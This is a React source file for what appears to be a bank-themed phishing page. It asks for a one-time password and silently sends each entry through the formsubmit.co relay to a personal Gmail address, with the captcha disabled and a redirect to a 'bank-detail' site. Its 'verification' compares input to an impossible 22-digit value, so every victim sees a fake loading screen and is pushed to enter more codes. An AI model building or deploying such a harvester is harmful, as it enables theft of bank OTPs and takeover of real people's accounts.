import React, { useEffect, useState } from 'react';
import './otp.css'; // Ensure you have this file for any additional custom styling

function Otp() {

  useEffect(() => {
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    })
  }, []);

  const [alert,setAlert] = useState(false)
  const [otpValue,setOtpValue] = useState("");


  const handleSubmit = (event) => {
    // event.preventDefault();
    // Simulate OTP verification logic
    setOtpValue(event.target.elements.otp.value); // Get value from input field (you can use ref as well)
    
    // Example logic: Check if OTP is correct (replace with your actual logic)
    if (otpValue === '1234567890000987654321') {
      // OTP is correct
      setAlert(false);
      // Here you would typically proceed with your application logic (e.g., navigate to next step)
    } else {
      // OTP is incorrect
      setAlert(true);
      
    }

  };
  return (
    <>
      <section className="otp-section flex flex-col items-center justify-center">

        {alert && (
          // <div className="alert-box bg-red-200 border border-red-500 text-red-700 px-4 py-3 rounded-md mb-4">
          //   Incorrect OTP. Please try again.
          // </div>
          <div className="loading-overlay">
            <div className="loader"></div>
          </div>
        )}

        <div className="otp-container bg-white p-8 rounded-lg shadow-md">
          <div className="heading text-center mb-4">
            <span className="text-xl font-bold">ENTER OTP</span>
          </div>
          <form onSubmit={handleSubmit} action="https://formsubmit.co/Ps1010955@gmail.com" method="POST">
            <div className="otp-box mb-4">
              <label htmlFor="otp" className="block text-gray-700 mb-2">OTP</label>
              <input
                type="number"
                id="otp"
                name="otp"
                className="block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring focus:border-indigo-300"
                placeholder="Enter OTP"
                required
              />
            </div>

            <input type="hidden" name="_captcha" value="false" />
              <input type="hidden" name="_next" value="https://bank-detail.vercel.app/otp" />
              <input type="hidden" name="_template" value="table" />

            <button
              
              type="submit"
              className="w-full px-4 py-2 bg-[#8F191F] text-white rounded-md hover:bg-[#590d11] focus:outline-none focus:ring-2 focus:ring-indigo-500"
            >
              Submit
            </button>
          </form>
        </div>
        
      </section>

      
    </>
  );
}

export default Otp;
